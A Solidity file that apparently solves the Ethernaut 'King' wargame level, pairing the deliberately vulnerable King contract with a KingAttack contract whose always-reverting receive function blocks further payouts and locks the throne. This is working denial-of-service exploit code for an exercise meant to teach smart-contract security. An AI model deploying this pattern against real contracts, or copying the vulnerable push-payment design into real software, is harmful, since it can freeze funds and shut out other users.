// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract KingAttack {

    King public king;

    event newKingArrived (
        address _newKing
    );

    constructor(address payable _kingInstanceAddress) public payable {
        king = King(_kingInstanceAddress);
    }

    // send ether and claim the throne
    function attack() external payable {
        require(msg.value >= 0.1 ether, "You need to send at least 0.1 ether");
        (bool success, bytes memory result) = payable(address(king)).call{value: msg.value}("");
        require(success, "External Call failed.");
        emit newKingArrived(msg.sender);
    }
    
    // falback function to revert king.tranfer function if anyone else would like to claim
    // the king's throne
    receive() external payable {
        require(false, "Cannot claim the throne!");
    }
    
}